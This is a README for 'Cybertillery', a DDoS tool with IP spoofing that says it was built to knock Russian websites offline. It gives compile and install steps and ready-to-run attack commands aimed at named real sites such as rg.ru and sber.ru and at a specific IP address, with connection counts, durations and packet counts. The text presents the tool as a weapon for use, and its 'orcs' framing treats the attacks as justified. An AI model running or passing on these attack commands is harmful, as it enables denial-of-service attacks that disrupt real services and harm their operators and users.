# Cybertillery - to fire on nasty orcs

DDoS tool with IP spoofing and ability to use parallel connections.
Built specifically to bring russian orc websites down to their knees.

### Compile command

```bash
make
```

### Install command
```bash
make install
```

## Usage examples

### Attack with 10 connections using URL with protocol

```bash
sudo ./bombard -u https://rg.ru -c 10
```

### Attack with 4 connections using IP address and port

```bash
sudo ./bombard -a 194.190.37.226 -p 443 -c 4
```

### Attack for 60 seconds

```bash
sudo ./bombard -u rg.ru/ -p 443 -c 4 -d 60
```

### Send 1000000 packets

```bash
sudo ./bombard -u https://sber.ru -c 10 -n 1000000
```

## Notes

If an error like this occurs:

```bash
$ sudo bombard -c 8 -a 192.168.4.1 -p 80
sudo: bombard: command not found
```

It means that you need to specify the environment variable ``PATH``
for ``sudo`` manually. To do that, use following command instead:

```bash
sudo env "PATH=$PATH" bombard -c 8 -a 192.168.4.1 -p 80
```


